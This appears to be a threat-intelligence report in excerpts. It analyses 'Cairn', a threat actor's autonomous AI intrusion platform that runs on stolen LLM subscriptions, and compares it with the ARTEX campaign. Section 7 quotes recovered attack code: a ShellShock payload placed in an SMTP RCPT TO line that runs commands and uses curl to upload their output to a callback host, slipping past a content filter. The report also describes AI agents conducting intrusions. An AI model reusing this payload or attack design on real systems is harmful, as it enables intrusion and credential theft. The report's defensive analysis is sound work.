1. Executive Summary

A Chinese-speaking threat actor has built and deployed a custom autonomous AI intrusion platform named Cairn, which selects targets, generates exploit chains, tracks failure states across sessions in a SQLite fact-graph, and iterates on blocked attack paths without sustained human involvement per session. Discovery resulted from routine investigation of a suspicious APAC-hosted VPS that was found serving an open staging directory on a non-standard port. The directory contained 150-plus active campaign artefacts including exploit tools, Chinese-language AI session logs, victim enumeration data, credential extracts, and platform management scripts.

Evidence recovered from these artefacts reveals a campaign active from 24 September 2026 through at least 13 October 2026, targeting a minimum of 85 organisations across the United States, Taiwan, Europe, and the broader Asia-Pacific region. Four distinct victim environments were positively identified from recovered artefacts. A fifth was targeted but could not be identified. Confirmed stolen material includes payment card stream data, customer plaintext credentials, Magento admin tokens, GCP service account private keys, MSSQL database credentials, and detailed internal network topology of a Taiwanese enterprise messaging provider including the contents of a 2.35 GB mail relay Mailbox and a cluster of 10 SQL Server production nodes.

The platform consumed 229,828 AI-dispatched attack sessions across 13 days, powered by two stolen Cline Pass subscriptions (combined ~$9,989 credit remaining at discovery) routing DeepSeek v4.1-flash through a pirated account rotation service. This report provides full technical analysis of the Cairn platform architecture, detailed walk-throughs of three confirmed intrusion chains sourced directly from recovered logs, an operator OPSEC assessment, and a comparison with the concurrent ARTEX campaign disclosed by Zscaler ThreatLabz.

4. The Cairn Platform: Architecture and Capability

4.1 Overview

Cairn is a fully custom autonomous penetration/intrusion platform. It is not a modified or weaponised version of any known open-source pentest framework. Its architecture separates concerns cleanly: a dispatcher process manages project scheduling and worker allocation; Docker containers provide per-victim isolation (one Kali Linux container per project); a local API server exposes the project and intent state to workers; an LLM proxy handles AI inference via stolen subscriptions; and per-session Chinese-language summaries create a persistent institutional memory that carries forward across the 128,000-token context window.

4.2 The AI Attack Loop

Each Cairn attack session follows a structured reasoning loop. The dispatcher reads the SQLite database to find projects with open intents and available workers, selects a worker, and issues the task. Inside the Docker container, the LLM receives the target’s fact-graph (graph.yaml), a goal statement, and a Chinese-language summary of all prior sessions. It selects the next intent (attack step), the container executes it, and the result is written back to the fact-graph. Sessions that cannot advance the graph are marked as failing; the dispatcher tries a different angle on the next cycle.

7. Technical Deep Dive: ShellShock over SMTP (CVE-2014-6271)

7.1 Why It Worked

The target SMTP server runs qmail with a vpopmail virtual mail system and an inline content filter (described in tool comments as an "Internal Firewall"). The filter inspects MAIL FROM and DATA body for the literal string () {, but does not inspect RCPT TO. When qmail-local processes a local delivery, it sets the recipient string into the RECIPIENT and LOCAL environment variables of a bash-3.2 subprocess. Bash 3.2 is vulnerable to CVE-2014-6271: a function definition in an environment variable causes the shell to execute the trailing command.

i051_shock_rce.py — RCPT TO payload construction
SHELLSHOCK_PREFIX = "() { :; }; "

def shellshock_rcpt(cmd, callback, domain="every8d.com"):
    """
    Build the RCPT TO line carrying the shellshock payload.
    Command output piped to curl -T - (chunked PUT upload).
    Pipe used instead of redirect: '>' would terminate the RCPT address.
    """
    return "RCPT TO:<%s%s|curl -s -T - http://%s/ev/%s@%s>" % (
        SHELLSHOCK_PREFIX, cmd, callback, label_of(cmd), domain)

The most parsimonious explanation is that these are two separate Chinese-speaking actors who independently adopted agentic AI frameworks for intrusion campaigns in the same two-week window. The shared use of DeepSeek v4.1-flash and the near-identical campaign start dates are striking, but ARTEX is open-source and publicly available, while Cairn appears to be a fully custom platform with months of prior engineering. This points to parallel development by actors operating in the same underground ecosystem who independently concluded that AI-driven autonomous attack tooling was viable and cost-effective, rather than a single actor running two campaign branches.

Key takeaway for defenders: Two separate actors, both Chinese-speaking, both initiating AI-driven autonomous intrusion campaigns in the last week of September 2026 is not coincidence. It indicates an inflection point in adversarial AI adoption. Defenders should treat autonomous AI-assisted scanning, reconnaissance, and exploitation as an active and expanding threat category, not a theoretical future risk.
